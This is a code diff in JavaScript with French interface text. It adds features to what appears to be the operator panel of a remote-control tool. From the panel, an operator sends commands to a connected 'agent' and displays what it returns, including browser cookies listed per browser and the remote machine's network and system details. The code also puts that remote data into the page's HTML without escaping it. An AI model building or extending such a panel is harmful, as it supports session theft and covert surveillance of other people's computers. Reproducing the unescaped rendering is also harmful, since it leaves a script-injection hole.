@@ -397,6 +397,89 @@ function connectToServer() {
   });
 
   socket.on('connect_error', () => setTitleStatus('error', 'Serveur inaccessible'));
+
+  socket.on('command:result', ({ agentId, cmd, data }) => {
+    if (cmd === 'get-info') {
+      renderInfo(data);
+      showToast('✅ Infos récupérées');
+    } else if (cmd === 'get-cookies') {
+      let txt = '';
+      for (const [browser, val] of Object.entries(data)) {
+        txt += `── ${browser} ──\n${val}\n\n`;
+      }
+      document.getElementById('cookiesOutput').textContent = txt || 'Aucun cookie trouvé';
+      showToast('🍪 Cookies récupérés');
+    } else {
+      showToast(`✅ ${cmd}: ${typeof data === 'string' ? data : JSON.stringify(data)}`);
+    }
+  });
+}
+
+// ── Side panel ──
+let spOpen = false;
+let spCurrentTab = 'info';
+
+function toggleSidePanel(tab) {
+  const panel = document.getElementById('sidePanel');
+  if (spOpen && spCurrentTab === tab) {
+    panel.classList.add('hidden');
+    spOpen = false;
+  } else {
+    panel.classList.remove('hidden');
+    spOpen = true;
+    switchSpTab(tab);
+  }
+}
+window.toggleSidePanel = toggleSidePanel;
+
+function switchSpTab(tab) {
+  spCurrentTab = tab;
+  ['info','macros','cookies'].forEach(t => {
+    document.getElementById(`spTab${t.charAt(0).toUpperCase()+t.slice(1)}`).classList.toggle('active', t === tab);
+    document.getElementById(`spBody${t.charAt(0).toUpperCase()+t.slice(1)}`).classList.toggle('hidden', t !== tab);
+  });
+}
+window.switchSpTab = switchSpTab;
+
+// ── Commandes macro ──
+window.sendCommand = function(cmd) {
+  if (!socket?.connected || !activeAgent) return;
+  socket.emit('command', { to: activeAgent, cmd });
+  showToast(`⏳ ${cmd}...`);
+};
+
+window.confirmCmd = function(cmd, msg) {
+  if (confirm(msg)) window.sendCommand(cmd);
+};
+
+function showToast(msg, duration = 3000) {
+  const t = document.getElementById('cmdToast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(t._timer);
+  t._timer = setTimeout(() => t.classList.remove('show'), duration);
+}
+
+function renderInfo(data) {
+  const el = document.getElementById('infoContent');
+  el.innerHTML = `
+    <div class="info-section">
+      <div class="info-section-title">Réseau</div>
+      ${(data.ips||[]).map(ip => `<div class="info-row"><span class="info-key">IP</span><span class="info-val ip">${ip}</span></div>`).join('')}
+    </div>
+    <div class="info-section">
+      <div class="info-section-title">Système</div>
+      <div class="info-row"><span class="info-key">Hostname</span><span class="info-val">${data.hostname||'-'}</span></div>
+      <div class="info-row"><span class="info-key">OS</span><span class="info-val">${data.platform||'-'} ${data.release||''}</span></div>
+      <div class="info-row"><span class="info-key">Arch</span><span class="info-val">${data.arch||'-'}</span></div>
+    </div>
+    <div class="info-section">
+      <div class="info-section-title">Matériel</div>
+      <div class="info-row"><span class="info-key">CPU</span><span class="info-val">${data.cpus||'-'}</span></div>
+      <div class="info-row"><span class="info-key">RAM totale</span><span class="info-val">${data.totalMem||'-'}</span></div>
+      <div class="info-row"><span class="info-key">RAM libre</span><span class="info-val">${data.freeMem||'-'}</span></div>
+      <div class="info-row"><span class="info-key">Uptime</span><span class="info-val">${data.uptime||'-'}</span></div>
+    </div>`;
 }
 
 // ── Démarrage ──
